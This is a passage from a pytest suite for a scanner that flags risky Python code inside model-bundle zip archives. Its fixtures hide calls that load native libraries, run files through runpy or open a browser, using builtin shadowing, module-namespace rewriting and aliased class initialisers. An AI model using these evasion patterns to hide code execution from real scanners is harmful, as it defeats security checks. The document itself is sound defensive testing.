            "opener = print or webbrowser.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            "import builtins\nimport ctypes\nbuiltins.print = False\n"
            "loader = print or ctypes.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            "import builtins\nimport ctypes\nvars(builtins)['print'] = False\n"
            "loader = print or ctypes.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            "import builtins\nimport ctypes\nvars(builtins).update({'print': False})\n"
            "loader = print or ctypes.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
    ],
)
def test_scan_zip_preserves_boolean_fallback_risk_after_builtin_mutation(
    tmp_path: Path, source: str, rule_code: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == rule_code
        for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "from runpy import run_path as runner\nFalse and (runner := print)\nrunner('payload.py')\n",
        (
            "from runpy import run_path as runner\nclass Broken:\n"
            "    def __enter__(self):\n        raise RuntimeError()\n"
            "    def __exit__(self, *args):\n        return False\n"
            "try:\n    with Broken() as runner:\n        pass\n"
            "except RuntimeError:\n    pass\nrunner('payload.py')\n"
        ),
    ],
)
def test_scan_zip_preserves_runpy_risk_after_non_executed_shadow(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_preserves_dynamic_member_risk_after_conditional_overwrite(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "browser = webbrowser.get()\n"
        "if replace:\n"
        "    browser.open = len\n"
        "    ctypes.windll.kernel32 = len\n"
        "browser.open('https://example.invalid')\n"
        "ctypes.windll.kernel32\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    assert checks_by_rule["S110"].details["reason"] == "high-risk calls: ctypes.windll.kernel32"


@pytest.mark.parametrize(
    "mutation",
    [
        "for c.CDLL in [print, c.CDLL]:\n    pass\n",
        "ns = c.__dict__\nfor ns['CDLL'] in [print, c.CDLL]:\n    pass\n",
        "original = c.CDLL\nc.CDLL = print\nfor (c.CDLL,) in [(print,), (original,)]:\n    pass\n",
        "original = c.CDLL\nc.CDLL = print\nns = c.__dict__\nfor (ns['CDLL'],) in [(print,), (original,)]:\n    pass\n",
        "import contextlib\nwith contextlib.nullcontext(c.CDLL) as c.CDLL:\n    pass\n",
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "contextlib.nullcontext = lambda ignored: real(original)\n"
            + "with contextlib.nullcontext(print) as c.CDLL:\n    pass\n"
        ),
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "contextlib.__dict__.update([('nullcontext', lambda **ignored: real(original))])\n"
            + "with contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n"
        ),
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "contextlib.__dict__.__ior__({'nullcontext': lambda **ignored: real(original)})\n"
            + "with contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n"
        ),
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "dict.__ior__(contextlib.__dict__, {'nullcontext': lambda **ignored: real(original)})\n"
            + "with contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n"
        ),
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "contextlib.__dict__.pop('nullcontext')\n"
            + "contextlib.__dict__.setdefault('nullcontext', lambda **ignored: real(original))\n"
            + "with contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n"
        ),
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "del contextlib.__dict__['nullcontext']\n"
            + "contextlib.__dict__.setdefault('nullcontext', lambda **ignored: real(original))\n"
            + "with contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n"
        ),
        (
            "import contextlib\noriginal = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            + "def enable():\n    contextlib.nullcontext = lambda ignored: real(original)\n"
            + "enable()\nwith contextlib.nullcontext(print) as c.CDLL:\n    pass\n"
        ),
    ],
)
def test_scan_zip_preserves_ctypes_risk_after_qualified_control_target(tmp_path: Path, mutation: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import ctypes as c\n" + mutation + "loader = c.CDLL\nloader('libpayload.so')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "mutation",
    [
        "for c.CDLL in [c.CDLL, print]:\n    pass\n",
        "ns = c.__dict__\nfor ns['CDLL'] in [c.CDLL, print]:\n    pass\n",
        "for (c.CDLL,) in [(c.CDLL,), (print,)]:\n    pass\n",
        "import contextlib\nc.CDLL = print\nwith contextlib.nullcontext(print) as c.CDLL:\n    pass\n",
        "import contextlib\nc.CDLL = print\nwith contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n",
        (
            "import contextlib\nc.CDLL = print\nreal = contextlib.nullcontext\ncontextlib.__dict__.pop('nullcontext')\n"
            + "contextlib.__dict__.setdefault('nullcontext', real)\n"
            + "with contextlib.nullcontext(enter_result=print) as c.CDLL:\n    pass\n"
        ),
    ],
)
def test_scan_zip_preserves_safe_final_qualified_control_target(tmp_path: Path, mutation: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import ctypes as c\n" + mutation + "loader = c.CDLL\nloader('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        for check in result.checks
    )


def test_scan_zip_flags_ctypes_getattr_dynamic_library_name(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "name = 'payload'\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "getattr(ctypes.cdll, name)\n"
        "ctypes.windll.__getattr__(name)\n"
        "loader.__getattr__(name)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert "ctypes.cdll.<dynamic>" in python_checks[0].details["reason"]
    assert "ctypes.windll.<dynamic>" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.<dynamic>" in python_checks[0].details["reason"]


def test_scan_zip_flags_unpacked_getattr_and_unbound_loader_getattr(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "getattr(*(ctypes.cdll, 'msvcrt'))\n"
        "getattr(*(ctypes.cdll,), 'ucrtbase')\n"
        "getattr(ctypes.cdll, *('vcruntime', None))\n"
        "hasattr(*(loader, 'payload'))\n"
        "hasattr(*(loader,), 'mixedpayload')\n"
        "ctypes.LibraryLoader.__getattr__(ctypes.cdll, 'advapi32')\n"
        "ctypes.LibraryLoader.__getattr__(*(ctypes.windll, 'kernel32'))\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert "ctypes.cdll.msvcrt" in python_checks[0].details["reason"]
    assert "ctypes.cdll.ucrtbase" in python_checks[0].details["reason"]
    assert "ctypes.cdll.vcruntime" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.payload" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.mixedpayload" in python_checks[0].details["reason"]
    assert "ctypes.cdll.advapi32" in python_checks[0].details["reason"]
    assert "ctypes.windll.kernel32" in python_checks[0].details["reason"]


def test_scan_zip_preserves_library_loader_member_risk_after_other_instance_overwrite(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "safe_loader.payload = len\n"
        "live_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "live_loader.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert python_checks[0].details["reason"] == "high-risk calls: ctypes.LibraryLoader.payload"


def test_scan_zip_preserves_webbrowser_controller_member_risk_after_other_instance_overwrite(
    tmp_path: Path,
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import webbrowser\n"
        "safe = webbrowser.get('safe')\n"
        "safe.open = len\n"
        "other = webbrowser.get('other')\n"
        "other.open('https://example.invalid')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S109"
    assert python_checks[0].details["reason"] == "high-risk calls: webbrowser.open"


def test_scan_zip_preserves_webbrowser_member_risk_after_other_controller_overwrite(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import webbrowser\n"
        "safe_browser = webbrowser.get('safe')\n"
        "safe_browser.open = len\n"
        "webbrowser.get('other').open('https://example.invalid')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S109"
    assert python_checks[0].details["reason"] == "high-risk calls: webbrowser.open"


def test_scan_zip_preserves_dynamic_member_risk_after_same_name_reassignment(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "browser = webbrowser.get('safe')\n"
        "browser.open = len\n"
        "browser = webbrowser.get('other')\n"
        "browser.open('https://example.invalid')\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload = len\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    assert checks_by_rule["S110"].details["reason"] == "high-risk calls: ctypes.LibraryLoader.payload"


def test_scan_zip_restores_dynamic_member_risk_after_delete(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "browser = webbrowser.get()\n"
        "browser.open = len\n"
        "del browser.open\n"
        "browser.open('https://example.invalid')\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload = len\n"
        "del loader.payload\n"
        "loader.payload\n"
        "ctypes.windll.payload = len\n"
        "del ctypes.windll.payload\n"
        "ctypes.windll.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    assert "ctypes.LibraryLoader.payload" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.windll.payload" in checks_by_rule["S110"].details["reason"]


def test_scan_zip_restores_dynamic_member_risk_after_delattr_and_namespace_rebind(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "browser = webbrowser.get()\n"
        "browser.open = len\n"
        "delattr(browser, 'open')\n"
        "browser.open('https://example.invalid')\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload = len\n"
        "delattr(loader, 'payload')\n"
        "loader.payload\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload = len\n"
        "globals()['loader'] = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    assert "ctypes.LibraryLoader.payload" in checks_by_rule["S110"].details["reason"]


def test_scan_zip_restores_loader_method_risk_after_delete(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.LoadLibrary = len\n"
        "del loader.LoadLibrary\n"
        "loader.LoadLibrary('loadlibrarypayload')\n"
        "loader.__getitem__ = len\n"
        "del loader.__getitem__\n"
        "loader.__getitem__('getitempayload')\n"
        "loader.__getattr__ = len\n"
        "delattr(*(loader, '__getattr__'))\n"
        "loader.__getattr__('getattrpayload')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert "ctypes.LibraryLoader.loadlibrarypayload" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.getitempayload" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.getattrpayload" in python_checks[0].details["reason"]


def test_scan_zip_preserves_ctypes_subclass_with_class_local_init_alias(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class MyCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.init(name)\n"
        "MyCDLL('/tmp/payload.so')\n"
        "ctypes.LibraryLoader(MyCDLL).payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert python_checks[0].details["reason"] == "high-risk calls: ctypes.CDLL, ctypes.LibraryLoader.payload"


def test_scan_zip_preserves_ctypes_subclass_class_body_and_qualified_init_aliases(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class Safe:\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.name = name\n"
        "class BodyAliasCDLL(Safe, ctypes.CDLL):\n"
        "    __init__ = ctypes.CDLL.__init__\n"
        "ctypes.LibraryLoader(BodyAliasCDLL).bodyalias\n"
        "class QualifiedAliasCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        QualifiedAliasCDLL.init(self, name)\n"
        "ctypes.LibraryLoader(QualifiedAliasCDLL).qualifiedalias\n"
        "class CustomReceiverCDLL(ctypes.CDLL):\n"
        "    def __init__(this, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(this, name)\n"
        "ctypes.LibraryLoader(CustomReceiverCDLL).customreceiver\n"
        "class StarredInitCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(*(self, name))\n"
        "ctypes.LibraryLoader(StarredInitCDLL).starredinit\n"
        "class ReceiverAliasCDLL(ctypes.CDLL):\n"
        "    def __init__(this, name: str) -> None:\n"
        "        target = this\n"
        "        ctypes.CDLL.__init__(target, name)\n"
        "ctypes.LibraryLoader(ReceiverAliasCDLL).receiveralias\n"
        "class CustomQualifiedAliasCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(this, name: str) -> None:\n"
        "        CustomQualifiedAliasCDLL.init(this, name)\n"
        "ctypes.LibraryLoader(CustomQualifiedAliasCDLL).customqualified\n"
        "class LocalClassAliasDangerousCDLL(ctypes.CDLL):\n"
        "    init = lambda self, name: None\n"
        "    def __init__(self, name: str) -> None:\n"
        "        cls = LocalClassAliasDangerousCDLL\n"
        "        cls.init = ctypes.CDLL.__init__\n"
        "        cls.init(self, name)\n"
        "ctypes.LibraryLoader(LocalClassAliasDangerousCDLL).localclassdangerous\n"
        "class DangerousQualifiedRebindCDLL(ctypes.CDLL):\n"
        "    init = lambda self, name: None\n"
        "    def __init__(self, name: str) -> None:\n"
        "        DangerousQualifiedRebindCDLL.init = ctypes.CDLL.__init__\n"
        "        DangerousQualifiedRebindCDLL.init(self, name)\n"
        "ctypes.LibraryLoader(DangerousQualifiedRebindCDLL).dangerousqualified\n"
        "class DefaultAliasCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str, init=ctypes.CDLL.__init__) -> None:\n"
        "        init(self, name)\n"
        "ctypes.LibraryLoader(DefaultAliasCDLL).defaultalias\n"
        "class DeletedInitCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        pass\n"
        "    del __init__\n"
        "ctypes.LibraryLoader(DeletedInitCDLL).deletedinit\n"
        "class ReachableNewCDLL(ctypes.CDLL):\n"
        "    def __new__(cls, name: str):\n"
        "        return super().__new__(cls)\n"
        "        return object()\n"
        "ctypes.LibraryLoader(ReachableNewCDLL).reachable\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert "ctypes.LibraryLoader.bodyalias" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.qualifiedalias" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.customreceiver" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.starredinit" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.receiveralias" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.customqualified" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.localclassdangerous" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.dangerousqualified" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.defaultalias" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.deletedinit" in python_checks[0].details["reason"]
    assert "ctypes.LibraryLoader.reachable" in python_checks[0].details["reason"]


def test_scan_zip_ignores_unreachable_ctypes_cdll_subclass_initializer(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class SafeCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        if False:\n"
        "            super().__init__(name)\n"
        "ctypes.LibraryLoader(SafeCDLL).payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_preserves_restored_runpy_execution_after_static_overwrite(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\n"
        "original = runpy.run_path\n"
        "runpy.run_path = len\n"
        "runpy.run_path = original\n"
        "runpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


@pytest.mark.parametrize(
    "restore",
    [
        "runpy.__dict__['run_path'] = original\n",
        "vars(runpy)['run_path'] = original\n",
        "runpy.__dict__.__setitem__('run_path', original)\n",
        "runpy.__dict__.update({'run_path': original})\n",
        "vars(runpy).update({'run_path': original})\n",
        "runpy.__dict__.update(run_path=original)\n",
        "vars(runpy).update(run_path=original)\n",
        "runpy.__dict__.update(**{'run_path': original})\n",
        "restore = runpy.__dict__.update\nrestore(run_path=original)\n",
        "dict.update(runpy.__dict__, run_path=original)\n",
        "runpy.__dict__.update([('run_path', original)])\n",
        "runpy.__dict__.__ior__({'run_path': original})\n",
        "dict.__ior__(runpy.__dict__, {'run_path': original})\n",
        "del runpy.__dict__['run_path']\nrunpy.__dict__.setdefault('run_path', original)\n",
        "runpy.__dict__.pop('run_path')\nrunpy.__dict__.setdefault('run_path', original)\n",
        "import builtins\nbuiltins.delattr(runpy, 'run_path')\nrunpy.__dict__.setdefault('run_path', original)\n",
        (
            "import builtins\nremove = builtins.delattr\nremove(runpy, 'run_path')\n"
            + "runpy.__dict__.setdefault('run_path', original)\n"
        ),
    ],
)
def test_scan_zip_preserves_restored_runpy_execution_after_namespace_overwrite(tmp_path: Path, restore: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\n"
        "import runpy as rp\n"
        "original = runpy.run_path\n"
        "rp.run_path = len\n" + restore + "rp.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


@pytest.mark.parametrize(
    "overwrite",
    [
        "runpy.__dict__.update(run_path=len)\n",
        "vars(runpy).update(run_path=len)\n",
        "runpy.__dict__.update(**{'run_path': len})\n",
        "overwrite = runpy.__dict__.update\noverwrite(run_path=len)\n",
        "dict.update(runpy.__dict__, run_path=len)\n",
        "import builtins\ngetattr(builtins, 'dict').update(runpy.__dict__, run_path=len)\n",
        "runpy.__dict__.update([('run_path', len)])\n",
        "runpy.__dict__.__ior__({'run_path': len})\n",
        "dict.__ior__(runpy.__dict__, {'run_path': len})\n",
        "runpy.run_path = print\nnamespace = runpy.__dict__\nnamespace |= {}\n",
        "del runpy.__dict__['run_path']\nrunpy.__dict__.setdefault('run_path', len)\n",
        "runpy.__dict__.pop('run_path')\nrunpy.__dict__.setdefault('run_path', len)\n",
        "import builtins\nbuiltins.delattr(runpy, 'run_path')\nrunpy.__dict__.setdefault('run_path', len)\n",
        (
            "import builtins\nremove = builtins.delattr\nremove(runpy, 'run_path')\n"
            + "runpy.__dict__.setdefault('run_path', len)\n"
        ),
    ],
)
def test_scan_zip_preserves_safe_runpy_namespace_overwrite(tmp_path: Path, overwrite: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy\n" + overwrite + "runpy.run_path('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    ("source", "rule_code"),
    [
        (
            "import runpy\nrunpy.__dict__.update({'run_path': len, 'other': runpy.run_path('payload.py')})\n",
            "S108",
        ),
        (
            "import runpy\nrunpy.__dict__.update([('run_path', len), ('other', runpy.run_path('payload.py'))])\n",
            "S108",
        ),
        (
            "import runpy\nrunpy.__dict__.__ior__({'run_path': len, 'other': runpy.run_path('payload.py')})\n",
            "S108",
        ),
        (
            "import webbrowser\n"
            "webbrowser.__dict__.update({'open': print, 'other': webbrowser.open('https://example.invalid')})\n",
            "S109",
        ),
        (
            "import ctypes\nctypes.__dict__.update({'CDLL': print, 'other': ctypes.CDLL('payload.so')})\n",
            "S110",
        ),
    ],
)
def test_scan_zip_preserves_risk_in_namespace_update_values(tmp_path: Path, source: str, rule_code: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == rule_code
        for check in result.checks
    )


def test_scan_zip_remains_conservative_after_unresolved_namespace_update(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\nimport ctypes\n"
        "runpy.__dict__.update({**{'run_path': False}})\n"
        "loader = print if runpy.run_path else ctypes.CDLL\n"
        "loader('payload.so')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        for check in result.checks
    )


def test_scan_zip_remains_conservative_after_helper_builtin_mutation(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins\nimport runpy as rp\n"
        "def disable():\n    builtins.print = False\n"
        "disable()\nrunner = print or rp.run_path\nrunner('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_does_not_treat_shadowed_dict_update_as_builtin_descriptor(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\n"
        "class Safe:\n"
        "    @staticmethod\n"
        "    def update(*args, **kwargs):\n"
        "        pass\n"
        "runpy.run_path = len\n"
        "dict = Safe\n"
        "dict.update(runpy.__dict__, run_path=runpy.run_path)\n"
        "runpy.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "prefix",
    [
        "import builtins\nbuiltins.dict = Safe\nbuiltins.dict.update",
        "import builtins as bi\nbi.dict = Safe\nbi.dict.update",
    ],
)
def test_scan_zip_does_not_treat_shadowed_builtins_dict_update_as_descriptor(tmp_path: Path, prefix: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\n"
        "class Safe:\n"
        "    @staticmethod\n"
        "    def update(*args, **kwargs):\n"
        "        pass\n"
        "runpy.run_path = len\n"
        f"{prefix}(runpy.__dict__, run_path=runpy.run_path)\n"
        "runpy.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_remains_conservative_after_shadowed_mutating_dict_update(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins\n"
        "import runpy as rp\n"
        "class Unsafe:\n"
        "    @staticmethod\n"
        "    def update(*args, **kwargs):\n"
        "        builtins.print = False\n"
        "dict = Unsafe\n"
        "dict.update()\n"
        "runner = print or rp.run_path\n"
        "runner('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
